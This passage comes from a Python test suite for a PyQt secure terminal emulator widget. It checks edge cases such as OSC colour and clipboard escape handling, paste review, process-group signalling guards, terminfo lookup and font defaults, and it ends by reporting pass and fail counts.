    ok(not _cw.has_foreground_program(),
       'has_foreground_program: a reaped shell (getpgid fails) -> False')
finally:
    _os.readlink = _o_readlink
    _os.getpgid = _o_getpgid

# cwd_basename: the home directory renders as '~'
_cw2 = SecureTerminal(command='/bin/cat')
_cw2._pid = 1
_cw2._foreground_pgrp = lambda: None
try:
    _os.readlink = lambda *_a, **_k: os.path.expanduser('~')
    eq(_cw2.cwd_basename(), '~', "cwd_basename: the home directory shows as ~")
finally:
    _os.readlink = _o_readlink

# --- a few testable feature branches ------------------------------------------
# _raw scrollback is capped (drop the oldest) when it overflows
_rw = SecureTerminal(command='/bin/cat')
_rw._raw = 'x' * (_rw._RAW_MAX + 10)
_rw._echo_caret('^C')
ok(len(_rw._raw) <= _rw._RAW_MAX, '_echo_caret caps the retained raw output')

# createMimeDataFromSelection returns a mime object
_ms = SecureTerminal(command='/bin/cat')
_ms._append('hello world')
_ms.selectAll()
ok(_ms.createMimeDataFromSelection() is not None,
   'createMimeDataFromSelection returns the selection as mime data')

# a double-click NOT on a marking falls through to the base handler
_dc2 = SecureTerminal(command='/bin/cat')
_dc2._append('plain')
_dbl2 = QMouseEvent(QEvent.Type.MouseButtonDblClick, QPointF(1, 1),
                    Qt.MouseButton.LeftButton, Qt.MouseButton.LeftButton,
                    Qt.KeyboardModifier.NoModifier)
_dc2.mouseDoubleClickEvent(_dbl2)
ok(True, 'double-click off a marking uses the default handler')

# --- OSC colour + clipboard-read handling -------------------------------------
_oc = SecureTerminal(command='/bin/cat')
eq(_oc._parse_osc_color(b'rgb:ab/cd/ef'), '#abcdef', 'OSC colour rgb: form parsed')
eq(_oc._parse_osc_color(b'#123456'), '#123456', 'OSC colour #hex form parsed')
eq(_oc._parse_osc_color(b'red'), '#ff0000', 'OSC colour name parsed')
ok(_oc._parse_osc_color(b'not-a-colour') is None, 'OSC colour: garbage -> None')
_oc._osc_color(4, b'1;rgb:ff/00/00')        # a valid palette override
ok(_oc._osc_palette.get(1) == '#ff0000', 'OSC 4 sets a palette index')
_oc._osc_color(4, b'no-semicolon')          # malformed -> ignored
_oc._osc_color(4, b'x;rgb:00/00/00')        # non-digit index -> ignored
_oc._osc_color(10, b'rgb:00/ff/00')         # default fg
_oc._osc_color(11, b'rgb:00/00/ff')         # default bg
_oc._osc_color(12, b'rgb:ff/ff/00')         # cursor
_oc._osc_color(10, b'garbage')              # unparseable -> ignored
ok('fg' in _oc._osc_palette and 'bg' in _oc._osc_palette,
   'OSC 10/11/12 override the default fg/bg/cursor colours')

# OSC 52 clipboard-read gating: off, approved, denied, always, and ask-once
_oc._osc['osc_clipboard_read'] = False
_oc._osc_clipboard_read()                   # feature off -> nothing
_oc._osc['osc_clipboard_read'] = True
_oc._clipboard_read = True
_oc._osc_clipboard_read()                   # approved -> reply
_oc._clipboard_read = False
_oc._osc_clipboard_read()                   # denied -> nothing
_oc._clipboard_read = None
_oc._clipboard_read_always = True
_oc._osc_clipboard_read()                   # global always-allow -> reply
_oc._clipboard_read = None
_oc._clipboard_read_always = False
_creq = []
_oc.clipboard_read_requested.connect(lambda: _creq.append(1))
_oc._osc_clipboard_read()                   # ask once -> raise the request
ok(_creq and _oc._clipboard_read == 'pending',
   'OSC 52 read: an un-granted tab asks once and never replies')

# feed guards: no pyte stream (line mode), an empty chunk, alt-leave with no save
_lm = SecureTerminal(command='/bin/cat')    # line mode -> _stream is None
_lm._feed_stream(b'anything')
_oc._feed_bytes(b'')
_oc._alt_leave()                            # _alt_saved is None -> returns
ok(True, 'feed guards: no stream, empty chunk and alt-leave-without-save are safe')

# --- more terminal branches ----------------------------------------------------
import fcntl as _fcntl                                          # noqa: E402
from PyQt6.QtGui import QHelpEvent                              # noqa: E402
from PyQt6.QtCore import QPoint                                 # noqa: E402

# apply_zoom while in grid mode schedules a repaint
_gz = SecureTerminal(command='/bin/cat')
_gz.apply_tui(True)
feed_output(_gz, b'\x1b[?1049h')            # alt screen -> grid mode
_gz.apply_zoom(150)
ok(True, 'apply_zoom in grid mode schedules a repaint')

# _set_winsize: no-fd short-circuit and an ioctl error are both swallowed
_sw = SecureTerminal(command='/bin/cat')
_sw._set_winsize(80, 24)                     # succeeds on a real pty
_o_ioctl = _fcntl.ioctl
try:
    _fcntl.ioctl = lambda *_a, **_k: (_ for _ in ()).throw(OSError())
    _sw._set_winsize(80, 24)                 # ioctl raises -> swallowed
finally:
    _fcntl.ioctl = _o_ioctl
_sw._fd = None
_sw._set_winsize(80, 24)                     # no fd -> return
ok(True, '_set_winsize tolerates a closed pty and an ioctl error')

# apply_markings toggles and re-renders only on a real change
_am = SecureTerminal(command='/bin/cat')
_am.apply_markings(not _am.markings_enabled())
ok(True, 'apply_markings re-renders on a change')

# _end_sync_update is a no-op when no synchronized update is open
_es = SecureTerminal(command='/bin/cat')
_es._end_sync_update()
ok(True, '_end_sync_update: nothing open -> no-op')

# _render_tui is a no-op with no pyte screen (line mode)
_rt2 = SecureTerminal(command='/bin/cat')
_rt2._render_tui()
ok(True, '_render_tui: no screen -> no-op')

# _on_readable swallows a spurious EAGAIN (non-blocking read not ready)
_or = SecureTerminal(command='/bin/cat')
_o_read = _os.read
try:
    _os.read = lambda *_a, **_k: (_ for _ in ()).throw(BlockingIOError())
    _or._on_readable()                       # EAGAIN -> return, no crash
finally:
    _os.read = _o_read
ok(True, '_on_readable: a not-ready non-blocking fd is handled')

# PageUp/PageDown scroll the scrollback (line mode)
_pg = SecureTerminal(command='/bin/cat')
key(_pg, Qt.Key.Key_PageUp)
key(_pg, Qt.Key.Key_PageDown)
ok(True, 'PageUp/PageDown drive the scrollbar')

# in TUI mode a plain key is encoded as VT input (keyPressEvent -> _tui_key)
_tk2 = SecureTerminal(command='/bin/cat')
_tk2.apply_tui(True)
_tks2 = spy_writes(_tk2)
key(_tk2, Qt.Key.Key_A, 'a')
ok(_tks2 == [b'a'], 'TUI mode: keyPressEvent routes a plain key through _tui_key')

# hook_enabled reflects whether a hook is configured
_he = SecureTerminal(command='/bin/cat')
ok(_he.hook_enabled() is False, 'hook_enabled: no hook -> False')

# a tooltip over empty space (no codepoint) hides any tip
_tt = SecureTerminal(command='/bin/cat')
_hv = QHelpEvent(QEvent.Type.ToolTip, QPoint(3, 3), _tt.mapToGlobal(QPoint(3, 3)))
_tt.event(_hv)
ok(True, 'a tooltip over empty space hides the tip without error')

# stop any repeating timers these grid/TUI terminals started, so they do not
# fire into the offscreen platform's static teardown (which would crash a
# process that has otherwise passed cleanly)
for _tstop in (_gz, _tk2, _rt2, _es, _am):
    for _tmr in ('_render_timer', '_sync_timer'):
        _t = getattr(_tstop, _tmr, None)
        if _t is not None:
            _t.stop()

# --- terminfo source lookup ---------------------------------------------------
from secure_terminal.terminal import _terminfo_source           # noqa: E402
ok(_terminfo_source() is None or isinstance(_terminfo_source(), str),
   '_terminfo_source resolves a path or returns None')

# createMimeDataFromSelection with no selection delegates to the base handler
_nm = SecureTerminal(command='/bin/cat')
_nm.moveCursor(QTextCursor.MoveOperation.End)
ok(_nm.createMimeDataFromSelection() is not None,
   'copy with no selection delegates to the base handler')

# terminate_foreground: refuses our own group; only-the-shell is a no-op; killpg error -> False
# refuses to signal secure-terminal's OWN process group (defensive self-kill guard).
_tfo = SecureTerminal(command='/bin/cat')
_tfo._pid = os.getpid()
_tfo._foreground_pgrp = lambda: os.getpgrp()
ok(not _tfo.terminate_foreground(),
   'terminate_foreground: refuses to signal our own process group')
_tfo.close()
# only the shell in the foreground (login shell, fg pgrp == the shell's own pgrp,
# in a session of its own so it is NOT our group) -> a no-op that signals nothing.
_tfs = _subprocess.Popen(['sleep', '30'], start_new_session=True)
pump(60)
_tf = SecureTerminal(command='/bin/cat')
_tf._command = None                         # login-shell semantics for this branch
_tf._pid = _tfs.pid
_tf._foreground_pgrp = lambda: os.getpgid(_tfs.pid)
ok(not _tf.terminate_foreground(),
   'terminate_foreground: only the shell in the foreground -> no-op')
ok(_tfs.poll() is None,
   'terminate_foreground: the shell no-op signals nothing')
_tf.close()
_tfs.terminate()
_tfs.wait()
# a killpg error (invalid pgrp) is reported as False.
_tf2 = SecureTerminal(command='/bin/cat')
_tf2._pid = None
_tf2._foreground_pgrp = lambda: 999999      # invalid pgrp -> killpg raises
ok(not _tf2.terminate_foreground(),
   'terminate_foreground: a killpg error is reported as False')
_tf2.close()

# _write retries after an EAGAIN on the non-blocking fd
_we = SecureTerminal(command='/bin/cat')
_wstate = {'n': 0}
_o_write2 = _os.write


def _flaky_write(fd, data):
    _wstate['n'] += 1
    if _wstate['n'] == 1:
        raise BlockingIOError()             # first call: kernel buffer not ready
    return _o_write2(fd, data)


try:
    _os.write = _flaky_write
    _we._write(b'hi')
finally:
    _os.write = _o_write2
ok(_wstate['n'] >= 2, '_write retries after an EAGAIN on the non-blocking fd')

# the grid-mode feed path caps the retained raw output
_bg = SecureTerminal(command='/bin/cat')
_bg.apply_tui(True)
feed_output(_bg, b'\x1b[?1049h')            # grid mode
_bg._raw = 'x' * _bg._RAW_MAX               # already at the cap
feed_output(_bg, b'y')                      # one more byte -> over cap -> trimmed
ok(len(_bg._raw) <= _bg._RAW_MAX, 'grid-mode feed caps the retained raw output')
_bg._render_timer.stop()
_bg._sync_timer.stop()

# --- OSC 52 clipboard WRITE (_osc_clipboard) ----------------------------------
import base64 as _b64                                           # noqa: E402
_ow = SecureTerminal(command='/bin/cat')
_ow._osc['osc_clipboard'] = True
_ow._osc_clipboard(b'no-semicolon')                             # malformed -> ignored
_ow._osc_clipboard(b'c;?')                                      # read/clear query -> declined
_ow._osc_clipboard(b'c;' + b'A' * 200000)                       # oversized -> declined
_ow._osc_clipboard(b'c;!!!not-base64!!!')                       # bad base64 -> ignored
_ow._osc_clipboard(b'c;' + _b64.b64encode(b'hello'))            # valid -> set clipboard
ok(True, 'OSC 52 write: malformed, query, oversized, bad-base64 and valid all handled')

# _on_readable creates the pyte screen on demand in TUI mode
_mk = SecureTerminal(command='/bin/cat')
_mk.apply_tui(True)
_mk._screen = None
feed_output(_mk, b'hi')                     # tui_active + no screen -> _make_screen
ok(_mk._screen is not None, '_on_readable builds the pyte screen on demand in TUI mode')
_mk._render_timer.stop()
_mk._sync_timer.stop()

# _place_grid_cursor is a no-op when the program hid the cursor
_pc = SecureTerminal(command='/bin/cat')
_pc.apply_tui(True)
feed_output(_pc, b'x')
if _pc._screen is not None:
    _pc._screen.cursor.hidden = True
    _pc._place_grid_cursor(_pc._screen)     # hidden -> returns without moving
ok(True, '_place_grid_cursor: a hidden cursor is left alone')
_pc._render_timer.stop()
_pc._sync_timer.stop()

# the escape-drop (line mode) path also caps the retained raw output
_ed = SecureTerminal(command='/bin/cat')
_ed._raw = 'x' * _ed._RAW_MAX
feed_output(_ed, b'\x1b]0;title\x07z')      # an OSC the line-mode path drops
ok(len(_ed._raw) <= _ed._RAW_MAX, 'the escape-drop path caps the retained raw output')

# _terminfo_source returns None when no candidate file exists
_o_isfile = _os.path.isfile
try:
    _os.path.isfile = lambda _p: False
    ok(_terminfo_source() is None,
       '_terminfo_source: no candidate on disk -> None')
finally:
    _os.path.isfile = _o_isfile

# sound_file_allowed swallows a realpath OS error
_o_realpath = _os.path.realpath
try:
    _os.path.realpath = lambda *_a, **_k: (_ for _ in ()).throw(OSError())
    ok(not _term.sound_file_allowed('/some/path.wav'),
       'sound_file_allowed: a realpath error -> rejected, not raised')
finally:
    _os.path.realpath = _o_realpath

# _write bails out once its 2s deadline passes (a child that never drains input)
_wd = SecureTerminal(command='/bin/cat')
import time as _time                                            # noqa: E402
_o_write3 = _os.write
_o_mono = _time.monotonic
_mono_calls = {'n': 0}


def _mono_jump():
    _mono_calls['n'] += 1
    return 0.0 if _mono_calls['n'] == 1 else 100.0   # base, then past the deadline


try:
    _os.write = lambda *_a, **_k: (_ for _ in ()).throw(BlockingIOError())
    _time.monotonic = _mono_jump
    _wd._write(b'z')                        # always EAGAIN + deadline passed -> bail
finally:
    _os.write = _o_write3
    _time.monotonic = _o_mono
ok(True, '_write bails out when its write deadline passes')

# --- terminfo directory: build-time entry, and tic-compiled on demand ---------
from secure_terminal.sanitize import MARK_KEY as _MK            # noqa: E402
_TISRC = 'secure-terminal|test term,\n\tam,\n\tcols#80,\n'
_o_ts = _term._terminfo_source
_o_cache = os.environ.get('XDG_CACHE_HOME')
try:
    # a compiled entry shipped next to the source is used directly
    _ti = tempfile.mkdtemp()
    with open(os.path.join(_ti, 'secure-terminal.ti'), 'w', encoding='utf-8') as _f:
        _f.write(_TISRC)
    os.makedirs(os.path.join(_ti, 's'))
    with open(os.path.join(_ti, 's', 'secure-terminal'), 'w', encoding='utf-8') as _f:
        _f.write('x')
    _term._terminfo_source = lambda: os.path.join(_ti, 'secure-terminal.ti')
    eq(_term.cli_terminfo_dir(), _ti,
       'cli_terminfo_dir: a build-time compiled entry is used as-is')
    # otherwise it compiles the source into the user cache with tic
    _ti2 = tempfile.mkdtemp()
    _src2 = os.path.join(_ti2, 'secure-terminal.ti')
    with open(_src2, 'w', encoding='utf-8') as _f:
        _f.write(_TISRC)
    os.environ['XDG_CACHE_HOME'] = tempfile.mkdtemp()
    _term._terminfo_source = lambda: _src2
    ok(_term.cli_terminfo_dir() is not None,
       'cli_terminfo_dir: compiles the terminfo via tic on demand')
    # when the cache directory cannot even be created (its parent is a file), the
    # compile step raises and it falls back to None
    _ti3 = tempfile.mkdtemp()
    _src3 = os.path.join(_ti3, 'secure-terminal.ti')
    with open(_src3, 'w', encoding='utf-8') as _f:
        _f.write(_TISRC)
    _blk = os.path.join(_ti3, 'blocker')
    with open(_blk, 'w', encoding='utf-8') as _f:
        _f.write('x')
    os.environ['XDG_CACHE_HOME'] = os.path.join(_blk, 'sub')   # parent is a file
    _term._terminfo_source = lambda: _src3
    ok(_term.cli_terminfo_dir() is None,
       'cli_terminfo_dir: an un-creatable cache dir falls back to None')
finally:
    _term._terminfo_source = _o_ts
    if _o_cache is None:
        os.environ.pop('XDG_CACHE_HOME', None)
    else:
        os.environ['XDG_CACHE_HOME'] = _o_cache

# _sync_display: re-entering grid mode with a cleared screen rebuilds it
_sd = SecureTerminal(command='/bin/cat')
_sd.apply_tui(True)
_sd._grid_shown = True
_sd._screen = None
_sd._sync_display()
ok(_sd._screen is not None, '_sync_display rebuilds a cleared pyte screen')
_sd._render_timer.stop()
_sd._sync_timer.stop()

# _delete_grid with scrollback above the live grid also eats the joining newline
_dg = SecureTerminal(command='/bin/cat')
_dg._append('l1\nl2\nl3\nl4\nl5')
_dg._grid_rows = 2
_dg._delete_grid()
ok(True, '_delete_grid removes the live grid and the newline joining it')

# _fmt_from_key: a marking carrying no colour yields a plain format
_ff = SecureTerminal(command='/bin/cat')
ok(_ff._fmt_from_key((_MK, (), 0x41)) is not None,
   '_fmt_from_key: a colourless marking -> a plain format')

# --- font: secure default + fixed-pitch fallback chain + per-tab set ----------
from secure_terminal.terminal import DEFAULT_FONT_FAMILY as _DFF   # noqa: E402
from PyQt6.QtGui import QFont as _QFont                            # noqa: E402
eq(_DFF, 'Hack', 'default font family is Hack (confusable-disambiguating, no ligatures)')
_fnt = SecureTerminal(command='/bin/cat')
eq(_fnt.current_font_family(), 'Hack', 'a new terminal starts on the default font family')
eq(_fnt.font().family(), 'Hack',
   'the terminal uses the chosen family (Hack is a hard dependency; no fallback list)')
ok(_fnt.font().styleHint() == _QFont.StyleHint.Monospace and _fnt.font().fixedPitch(),
   'the terminal font is fixed-pitch monospace (steers Qt substitution; no proportional pick)')
_fnt.set_font_family('JetBrains Mono')
eq(_fnt.current_font_family(), 'JetBrains Mono', 'set_font_family switches the tab font')
ok(_fnt.font().families()[:1] == ['JetBrains Mono'], 'the new family is applied to the widget')
_fnt.set_font_family('   ')
eq(_fnt.current_font_family(), 'Hack', 'an empty/whitespace family falls back to the default')
_fnt.set_font_family('IBM Plex Mono')
_fnt.apply_zoom(150)
eq(_fnt.current_font_family(), 'IBM Plex Mono', 'a zoom change preserves the chosen family')

# --- keyPressEvent: a preview has no child, so keys defer to the base ----------
_pvk = SecureTerminal(preview=True)
_pvsent = spy_writes(_pvk)
key(_pvk, Qt.Key.Key_A, 'a')                 # preview branch: super() handles, nothing sent
ok(not _pvsent, 'keyPressEvent: a preview terminal sends nothing to a child')

# --- keyPressEvent while a paste review is held: input is suspended ------------
_rvk = SecureTerminal(command='/bin/cat')
_rvk.apply_paste_warn('always')
_rvksent = spy_writes(_rvk)
_rvmime = QMimeData()
_rvmime.setText('held paste')
_rvk.insertFromMimeData(_rvmime)             # -> review held, input suspended
ok(_rvk.review_pending(), 'a held paste suspends input for review')
key(_rvk, Qt.Key.Key_X, 'x')                 # a stray key is swallowed, never sent
ok(not _rvksent and _rvk.review_pending(),
   'keyPressEvent: a stray key during review is swallowed, not sent')
key(_rvk, Qt.Key.Key_Return)                 # Enter rejects the held paste (safe default)
ok(not _rvk.review_pending() and not _rvksent,
   'keyPressEvent: Enter during review rejects the held paste')
_rvk.shutdown()

# --- dispatch_pending_copy is a no-op when no copy review is pending -----------
_dpc = SecureTerminal(command='/bin/cat')
_dpc.dispatch_pending_copy('stripped')       # nothing pending -> early return
ok(True, 'dispatch_pending_copy: a no-op when no review is active')
_dpc.shutdown()

# --- contextMenuEvent builds the reviewed menu and shows it --------------------
from PyQt6.QtGui import QContextMenuEvent as _QCME               # noqa: E402
from PyQt6.QtWidgets import QMenu as _QMenu2                     # noqa: E402
_cme = SecureTerminal(command='/bin/cat')
_o_menuexec = _QMenu2.exec
_QMenu2.exec = lambda *_a, **_k: None
try:
    _cev = _QCME(_QCME.Reason.Mouse, _QPoint(5, 5), _cme.mapToGlobal(_QPoint(5, 5)))
    _cme.contextMenuEvent(_cev)
    ok(True, 'contextMenuEvent shows the reviewed context menu')
finally:
    _QMenu2.exec = _o_menuexec
_cme.shutdown()

# --- _reviewed_context_menu tolerates an already-disconnected copy action ------
from PyQt6.QtGui import QAction as _QAction2                     # noqa: E402
_rcm = SecureTerminal(command='/bin/cat')
_o_std = _rcm.createStandardContextMenu


def _fake_std(_pos=None):
    _fm = _QMenu2(_rcm)
    _fa = _QAction2('Copy', _fm)
    _fa.setObjectName('edit-copy')
    _fm.addAction(_fa)
    # drain the menu's own triggered connection so the reroute's disconnect()
    # finds nothing to disconnect -> the defensive TypeError path fires.
    try:
        _fa.triggered.disconnect()
    except TypeError:
        pass
    return _fm


_rcm.createStandardContextMenu = _fake_std
try:
    _m2 = _rcm._reviewed_context_menu(_QPoint(5, 5))
    ok(any(a.objectName() == 'edit-copy' for a in _m2.actions()),
       '_reviewed_context_menu tolerates an undisconnectable copy action')
finally:
    _rcm.createStandardContextMenu = _o_std
_rcm.shutdown()

# --- shutdown tolerates an already-disconnected readable notifier --------------
_sdn = SecureTerminal(command='/bin/cat')
if _sdn._notifier is not None:
    _sdn._notifier.activated.disconnect()    # pre-disconnect: shutdown's disconnect raises
_sdn.shutdown()                              # -> except (TypeError, RuntimeError): pass
ok(True, 'shutdown tolerates an already-disconnected readable notifier')

# --- _cp_at falls back to an untagged readable glyph's own codepoint -----------
# In show mode the render tags every non-ASCII cell with its source codepoint;
# a glyph inserted straight into the document (no tag) exercises the char-itself
# fallback in _cp_in_box.
_cpf = SecureTerminal(command='/bin/cat')
_cpf.apply_mode('show')
_cpfcur = _cpf.textCursor()
_cpfcur.insertText(chr(0x00E9) * 3)          # 'e-acute', inserted untagged (no _CP_PROP)
_cpf.resize(600, 200)
_cpf.show()
pump(30)
_cpfpc = QTextCursor(_cpf.document())
_cpfpc.setPosition(1)
eq(_cpf._cp_at(_cpf.cursorRect(_cpfpc).center()), 0x00E9,
   '_cp_at falls back to an untagged readable glyph own codepoint')
_cpf.shutdown()

# --- result -------------------------------------------------------------------
sys.stdout.write('secure-terminal-tests(widget): %d passed, %d failed\n'
                 % (PASS, FAIL))
# The offscreen Qt platform can crash in its static teardown after a clean run
# (destroying the many widgets/pyte screens/timers this suite builds), which
# would turn a fully-passing run into a non-zero exit. All tests have run and the
# result is known, so persist coverage and exit hard, bypassing that teardown.
try:
    import coverage as _coverage
    _covw = _coverage.Coverage.current()
    if _covw is not None:
        _covw.save()
except Exception:
    pass                    # coverage is optional instrumentation, never fatal
sys.stdout.flush()
sys.stderr.flush()
os._exit(0 if FAIL == 0 else 1)
